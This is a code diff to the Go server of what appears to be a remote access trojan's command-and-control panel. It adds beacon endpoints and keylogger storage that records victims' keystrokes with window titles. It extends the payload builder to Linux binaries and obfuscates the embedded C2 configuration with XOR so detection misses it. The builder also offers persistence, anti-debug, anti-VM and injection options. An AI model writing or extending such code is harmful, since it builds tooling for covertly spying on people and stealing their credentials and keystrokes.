@@ -92,6 +92,52 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 		api.POST("/modules/load", loadModuleHandler)
 		api.POST("/modules/unload", unloadModuleHandler)
 	}
+
+	// Agent HTTP beacon endpoints (for the hardened C++ Windows agent).
+	// Separate from WebSocket /ws/agent used by the Rust Linux agent.
+	r.POST("/agent", agentHTTPBeaconHandler(agentMgr))
+	r.POST("/beacon", agentHTTPDataTaskHandler(agentMgr))
+}
+
+func agentHTTPDataTaskHandler(agentMgr *agent.Manager) gin.HandlerFunc {
+	return func(c *gin.Context) {
+		var msg struct {
+			Type    string `json:"type"`
+			HwID    string `json:"hw_id"`
+			Data    string `json:"data"`
+			Title   string `json:"window_title"`
+		}
+		if err := c.ShouldBindJSON(&msg); err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
+			return
+		}
+		a, ok := agentMgr.GetByHwID(msg.HwID)
+		if !ok {
+			c.JSON(http.StatusNotFound, gin.H{"error": "unknown agent"})
+			return
+		}
+		agentMgr.UpdateLastSeen(a.ID)
+
+		switch msg.Type {
+		case "keystrokes":
+			if db == nil {
+				log.Printf("[Beacon] db is nil — dropping keystrokes from %s", a.ID)
+			} else {
+				res, err := db.Exec(`INSERT INTO keystrokes (agent_id, window_title, keys) VALUES (?, ?, ?)`,
+					a.ID, msg.Title, msg.Data)
+				if err != nil {
+					log.Printf("[Beacon] keystroke insert: %v", err)
+				} else {
+					if aff, _ := res.RowsAffected(); aff == 0 {
+						log.Printf("[Beacon] keystroke insert affected=0 agent=%s", a.ID)
+					}
+				}
+			}
+		default:
+			// unknown data type — accepted, ignored
+		}
+		c.JSON(http.StatusOK, gin.H{"status": "ok"})
+	}
 }
 
 func loginHandler(c *gin.Context) {
@@ -436,7 +482,25 @@ func getDiscordTokensHandler(c *gin.Context) {
 }
 
 func getKeystrokesHandler(c *gin.Context) {
-	c.JSON(http.StatusOK, []interface{}{})
+	agentID := c.Param("id")
+	if db == nil {
+		c.JSON(http.StatusOK, []interface{}{})
+		return
+	}
+	type KS struct {
+		ID        int64  `json:"id" db:"id"`
+		Window    string `json:"window_title" db:"window_title"`
+		Keys      string `json:"keys" db:"keys"`
+		CreatedAt string `json:"created_at" db:"timestamp"`
+	}
+	var rows []KS
+	err := db.Select(&rows, `SELECT id, window_title, keys, timestamp FROM keystrokes WHERE agent_id = ? ORDER BY timestamp DESC LIMIT 500`, agentID)
+	if err != nil {
+		log.Printf("[api] keystrokes select: %v", err)
+		c.JSON(http.StatusOK, []interface{}{})
+		return
+	}
+	c.JSON(http.StatusOK, rows)
 }
 
 func getScreenshotsHandler(c *gin.Context) {
@@ -547,26 +611,38 @@ func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 		}
 		defer file.Close()
 
-		if !strings.HasSuffix(strings.ToLower(header.Filename), ".exe") {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "Only .exe files are supported"})
+		// Support both Windows EXE and Linux ELF
+		filename := strings.ToLower(header.Filename)
+		isWindows := strings.HasSuffix(filename, ".exe")
+		isLinux := isELF(filename) || isELFFile(file)
+		if !isWindows && !isLinux {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "Only .exe (Windows) or ELF (Linux) files are supported"})
 			return
 		}
 
 		// Parse config from form
 		cfg := PayloadConfig{
-			C2Host:       c.PostForm("c2_host"),
-			C2Port:       c.PostForm("c2_port"),
-			UseTLS:       c.PostForm("use_tls") == "true",
-			Key:          c.PostForm("key"),
-			HMACKey:      c.PostForm("hmac_key"),
+			C2Host:        c.PostForm("c2_host"),
+			C2Port:        c.PostForm("c2_port"),
+			UseTLS:        c.PostForm("use_tls") == "true",
+			Key:           c.PostForm("key"),
+			HMACKey:       c.PostForm("hmac_key"),
 			SleepInterval: parseInt(c.PostForm("sleep_interval"), 60),
-			Jitter:       parseInt(c.PostForm("jitter"), 10),
-			Persistence:  c.PostForm("persistence") == "true",
-			HideConsole:  c.PostForm("hide_console") == "true",
-			AntiDebug:    c.PostForm("anti_debug") == "true",
-			AntiVM:       c.PostForm("anti_vm") == "true",
+			Jitter:        parseInt(c.PostForm("jitter"), 10),
+			Persistence:   c.PostForm("persistence") == "true",
+			HideConsole:   c.PostForm("hide_console") == "true",
+			AntiDebug:     c.PostForm("anti_debug") == "true",
+			AntiVM:        c.PostForm("anti_vm") == "true",
 			InjectionMethod: c.PostForm("injection_method"),
+			Platform:      c.PostForm("platform"),
 		}
+
+		// Default platform to windows if not specified
+		if cfg.Platform == "" {
+			cfg.Platform = "windows"
+		}
+
+		isLinux = cfg.Platform == "linux"
 
 		if cfg.C2Host == "" {
 			c.JSON(http.StatusBadRequest, gin.H{"error": "C2 host is required"})
@@ -575,7 +651,11 @@ func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 
 		// Create payload record
 		payloadID := uuid.New().String()
-		tempPath := filepath.Join(fileMgr.GetStoragePath(), "payloads", payloadID+".exe")
+		ext := ".exe"
+		if isLinux {
+			ext = ""
+		}
+		tempPath := filepath.Join(fileMgr.GetStoragePath(), "payloads", payloadID+ext)
 
 		if err := os.MkdirAll(filepath.Dir(tempPath), 0755); err != nil {
 			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create payload directory"})
@@ -589,9 +669,10 @@ func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 			return
 		}
 
-		// Serialize the operator C2 config and append it as a discoverable trailer.
-		// Loader contract: scan for magic "RATC2CFG", next 4 bytes = uint32 LE length,
-		// then that many bytes of JSON (PayloadConfig). The agent reads this to beacon.
+		// Serialize the operator C2 config and append it as an obfuscated trailer.
+		// Loader contract: scan for magic "RATC2CFG" XOR 0x33, next 4 bytes =
+		// uint32 LE length, then that many bytes of rolling-XOR JSON:
+		// body[i] = json[i] ^ (0x5A + (12+i)). Agent mirrors this exactly.
 		configJSON, err := json.Marshal(cfg)
 		if err != nil {
 			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to encode config"})
@@ -599,7 +680,12 @@ func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 		}
 		var lenBuf [4]byte
 		binary.LittleEndian.PutUint32(lenBuf[:], uint32(len(configJSON)))
-		trailer := append(append([]byte("RATC2CFG"), lenBuf[:]...), configJSON...)
+		magic := []byte{0x61, 0x72, 0x67, 0x70, 0x01, 0x70, 0x75, 0x74} // "RATC2CFG"^0x33
+		enc := make([]byte, len(configJSON))
+		for i, b := range configJSON {
+			enc[i] = b ^ byte(0x5A+(12+i))
+		}
+		trailer := append(append(magic, lenBuf[:]...), enc...)
 		patched := append(exeBytes, trailer...)
 
 		if err := os.WriteFile(tempPath, patched, 0644); err != nil {
@@ -641,6 +727,7 @@ type PayloadConfig struct {
 	AntiDebug      bool   `json:"anti_debug"`
 	AntiVM         bool   `json:"anti_vm"`
 	InjectionMethod string `json:"injection_method"`
+	Platform       string `json:"platform"` // "windows" or "linux"
 }
 
 func parseInt(s string, defaultVal int) int {
@@ -652,6 +739,26 @@ func parseInt(s string, defaultVal int) int {
 		return defaultVal
 	}
 	return val
+}
+
+// isELF checks if a filename suggests an ELF binary
+func isELF(filename string) bool {
+	// Common Linux binary extensions / no extension
+	lower := strings.ToLower(filename)
+	return strings.HasSuffix(lower, ".elf") ||
+		strings.HasSuffix(lower, ".bin") ||
+		strings.HasSuffix(lower, ".out") ||
+		!strings.Contains(lower, ".") // no extension often means ELF on Linux
+}
+
+// isELFFile reads the first 4 bytes to check for ELF magic
+func isELFFile(file io.ReaderAt) bool {
+	header := make([]byte, 4)
+	n, err := file.ReadAt(header, 0)
+	if err != nil || n < 4 {
+		return false
+	}
+	return string(header) == "\x7fELF"
 }
 
 func getPayloadHistoryHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
@@ -746,15 +853,77 @@ func startAgentPayloadServer(fileMgr *filetransfer.Manager, port int) {
 	http.ListenAndServe(fmt.Sprintf(":%d", port), mux)
 }
 
-func serveAgentBinary(fileMgr *filetransfer.Manager, bindAddr string, binaryPath string) {
+func ServeAgentBinary(fileMgr *filetransfer.Manager, bindAddr string, binaryPath string) {
 	mux := http.NewServeMux()
 
 	mux.HandleFunc("/agent", func(w http.ResponseWriter, r *http.Request) {
+		log.Printf("[AgentBinary] Request: %s, Path: %s", r.URL.Path, binaryPath)
+		if _, err := os.Stat(binaryPath); os.IsNotExist(err) {
+			log.Printf("[AgentBinary] File not found: %s", binaryPath)
+			http.NotFound(w, r)
+			return
+		}
 		w.Header().Set("Content-Type", "application/octet-stream")
 		w.Header().Set("Content-Disposition", "attachment; filename=agent.exe")
 		http.ServeFile(w, r, binaryPath)
 	})
 
+	// Also serve Linux agent at /agent/linux
+	linuxPath := filepath.Join(filepath.Dir(binaryPath), "agent_linux")
+	mux.HandleFunc("/agent/linux", func(w http.ResponseWriter, r *http.Request) {
+		if _, err := os.Stat(linuxPath); os.IsNotExist(err) {
+			http.NotFound(w, r)
+			return
+		}
+		w.Header().Set("Content-Type", "application/octet-stream")
+		w.Header().Set("Content-Disposition", "attachment; filename=agent_linux")
+		http.ServeFile(w, r, linuxPath)
+	})
+
 	log.Printf("[*] Agent binary server listening on %s", bindAddr)
 	http.ListenAndServe(bindAddr, mux)
+}
+
+func agentHTTPBeaconHandler(agentMgr *agent.Manager) gin.HandlerFunc {
+	return func(c *gin.Context) {
+		if c.Request.Method != http.MethodPost {
+			c.JSON(http.StatusMethodNotAllowed, gin.H{"error": "POST required"})
+			return
+		}
+
+		var reg agent.RegistrationData
+		if err := c.ShouldBindJSON(&reg); err != nil {
+			log.Printf("[AgentHTTP] Invalid JSON: %v", err)
+			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON body"})
+			return
+		}
+
+		// Get client IP
+		ip := c.ClientIP()
+		if ip == "::1" || ip == "127.0.0.1" {
+			// Try to get real IP from headers
+			if xff := c.GetHeader("X-Forwarded-For"); xff != "" {
+				ip = strings.Split(xff, ",")[0]
+			} else if xri := c.GetHeader("X-Real-IP"); xri != "" {
+				ip = xri
+			}
+		}
+
+		// Register or reconnect agent
+		agt, err := agentMgr.Register(&reg, nil, ip)
+		if err != nil {
+			log.Printf("[AgentHTTP] Register failed: %v", err)
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "Registration failed"})
+			return
+		}
+
+		log.Printf("[AgentHTTP] Agent registered: %s (%s) from %s", agt.ID, agt.Hostname, ip)
+
+		// Return agent ID and session ID for the agent to use
+		c.JSON(http.StatusOK, gin.H{
+			"agent_id":   agt.ID,
+			"session_id": agt.SessionID,
+			"status":     "registered",
+		})
+	}
 }
